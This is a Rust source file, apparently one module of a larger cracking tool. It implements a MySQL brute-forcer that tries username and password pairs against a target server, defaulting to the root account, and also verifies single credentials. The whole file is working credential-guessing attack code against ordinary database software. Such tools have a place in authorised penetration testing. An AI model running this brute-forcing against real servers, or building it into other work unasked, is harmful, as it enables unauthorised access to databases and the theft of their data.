//! MySQL 爆破模块

use async_trait::async_trait;
use mysql_async::Pool;
use std::time::Duration;

use crate::cracker::base;
use crate::cracker::service::{CrackConfig, CrackResult, CrackService, Cracker};

/// MySQL 爆破器
pub struct MysqlCracker;

impl MysqlCracker {
    pub fn new() -> Self {
        Self
    }
}

impl Default for MysqlCracker {
    fn default() -> Self {
        Self::new()
    }
}

#[async_trait]
impl Cracker for MysqlCracker {
    async fn crack(&self, config: &CrackConfig) -> CrackResult {
        let target = config.target.clone();
        let port = config.port;

        base::run_crack(
            config,
            CrackService::Mysql,
            "MySQL",
            move |username, password, _, _, timeout| {
                let username = username.unwrap_or_else(|| "root".to_string());
                let url = format!(
                    "mysql://{}:{}@{}:{}/mysql",
                    username, password, target, port
                );

                let pool = match Pool::from_url(&url) {
                    Ok(p) => p,
                    Err(_) => return false,
                };

                // 使用 tokio runtime 执行异步连接
                let rt = match tokio::runtime::Runtime::new() {
                    Ok(rt) => rt,
                    Err(_) => return false,
                };

                matches!(
                    rt.block_on(tokio::time::timeout(timeout, pool.get_conn())),
                    Ok(Ok(_))
                )
            },
        )
        .await
    }

    async fn verify(
        &self,
        target: &str,
        port: u16,
        username: Option<&str>,
        password: &str,
    ) -> bool {
        let username = username.unwrap_or("root");
        let url = format!(
            "mysql://{}:{}@{}:{}/mysql",
            username, password, target, port
        );

        let pool = match Pool::from_url(&url) {
            Ok(p) => p,
            Err(_) => return false,
        };

        matches!(
            tokio::time::timeout(Duration::from_secs(5), pool.get_conn()).await,
            Ok(Ok(_))
        )
    }
}
